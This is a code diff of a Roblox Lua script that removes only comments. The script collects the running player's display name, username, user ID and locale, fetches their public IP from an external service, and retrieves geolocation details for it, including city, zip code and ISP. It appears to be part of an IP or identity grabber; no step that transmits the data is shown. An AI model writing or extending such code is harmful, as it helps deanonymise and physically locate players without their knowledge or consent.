@@ -1,22 +1,22 @@
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
-local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
-local Name = game.Players.LocalPlayer.Name -- Name
-local Userid = game.Players.LocalPlayer.UserId -- UserId
-local Country = game.LocalizationService.RobloxLocaleId -- Country
-local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local DName = game.Players.LocalPlayer.DisplayName
+local Name = game.Players.LocalPlayer.Name
+local Userid = game.Players.LocalPlayer.UserId
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
 local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
 
 local IpFields = {
-    "query", -- IP address
-    "country", -- Country
-    "regionName", -- Region
-    "city", -- City
-    "zip", -- Zip code
-    "isp", -- ISP
-    "org", -- Organization
-    "as", -- Autonomous system
+    "query", 
+    "country",
+    "regionName",
+    "city",
+    "zip",
+    "isp",
+    "org",
+    "as", 
 }
 
 local IpInfoFields = {}
